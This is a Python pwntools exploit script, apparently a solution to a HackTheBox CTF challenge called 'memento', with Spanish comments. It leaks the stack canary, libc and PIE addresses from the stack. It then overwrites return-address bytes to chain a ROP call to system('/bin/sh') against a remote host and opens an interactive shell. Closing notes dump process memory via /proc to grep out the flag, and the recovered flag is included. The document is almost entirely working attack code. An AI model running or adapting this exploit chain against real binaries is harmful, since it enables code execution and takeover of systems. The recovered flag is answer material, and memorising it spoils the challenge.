#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or './memento_patched', checksec = False)
libc = ELF("libc.so.6", checksec = False)

context.log_level = 'warning'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("83.136.255.106", 53114)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
continue
'''.format(**locals())

needle = b'HTB{aaaabaaaaaaacaaaaaaadaaaa}'

REMEMBER = b'A' # store
RECALL = b'B' # print
RESET = b'C' # set to 0

io = start()

def sla(a, b): return io.sendlineafter(a, b)
def sl(b): return io.sendline(b)
def s(b): return io.send(b)
def rlu(a): return io.recvuntil(a)
def rl(): return io.recvline() 
def logleak(name, addr): print(f"[*] " + name + " = %#x" % addr)

s(needle)


fill = REMEMBER
fill += b'\x18'
fill += b'a' * 0x18
fill += REMEMBER
fill += b'\x01'

s(fill + b'\x90' + RECALL)

rlu(b'a' * 24 + b'\x91')
dump = b'\x00' + io.recvn(0x91 - 25)[:-1]

leaks = []

for i in range(int(len(dump) / 8)):
    leaks.append(int(hex(u64(dump[i * 8: (i + 1) * 8])), 16))

print(f"[*] Dumping {len(leaks)} qwords from stack: ")

for i in leaks:
    print(f"\t[*] %#x " % i, end="")
    if leaks.index(i) in (1, 2, 4, 8, len(leaks)-1):
        print("(!!!)")
    else: print()
print()


buf_addr = leaks[1] + 0x7
canary = leaks[2]
libc_leak = leaks[4]
_rtld_global = leaks[-1]
main = leaks[8]
exe.address = main - exe.sym.main
libc.address = libc_leak - 0x2a1ca
gadgets = ROP(libc)

logleak('buf address', buf_addr)
logleak('canary', canary)
logleak('__libc_start_main+XXX', libc_leak)
logleak('glibc base', libc.address)
logleak('piebase', exe.address)

s(RESET)


s(fill + b'\x00')

s(REMEMBER)


payload = b'\x07' + b'\x00' * 0x7

s(payload)


s(REMEMBER + b'\x01')

return_addr = buf_addr - 0x68 - 1 +0x18 # restamos 1 pq le suma el programa 

#print()

s(p8(return_addr & 0xff)) # overwrite last byte of buf_addr with the last byte of the return address so it gets written over __libc_start_main

payload = flat(libc.sym.system)

logleak("payload length", len(payload))

s(REMEMBER + b'\x08')

logleak('return addr', return_addr+1)

print(payload)


s(payload)



## Last phase

s(RESET)

fill = REMEMBER
fill += b'\x18'
fill += b"/bin/sh\x00" + b'a' * 0x10
fill += REMEMBER
fill += b'\x01'


s(fill + b'\x00')
s(REMEMBER)


payload = b'\x07' + b'\x00' * 0x7

s(payload)


s(REMEMBER + b'\x01')

return_addr = buf_addr - 0x68 - 1 # restamos 1 pq le suma el programa 

#print()

s(p8(return_addr & 0xff)) # overwrite last byte of buf_addr with the last byte of the return address so it gets written over __libc_start_main

payload = flat(gadgets.ret.address)
payload += flat(gadgets.rdi.address)[:6]

# en la siguiente qword a rdi ya está la dirección de nuestro buffer, muy conveniente, por eso tenemos nuestros primeros 8 bytes de fill como /bin/sh

logleak("payload length", len(payload))

s(REMEMBER + b'\x0e')

s(payload)
io.interactive()

"""

la libc la pillamos de libc.blukat tal mirando el offset de libc start main 

UNa vez dentro hay que inspeccionar la memoria del proceso:

cat /proc/<pid>/maps para ver la region del heap

dd if=/proc/110/mem of=/tmp/heap.dump bs=4096 skip=$((0x55e7f5641000/4096)) count=$((0x21000/4096)) <- dumpeamos heap

grep -ao "HTB.\{0,32\}" /tmp/*.dump

$ grep -ao "HTB.\{0,32\}" /tmp/*.dump
HTB{n0w_wh3re_w4s_1}\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00



"""

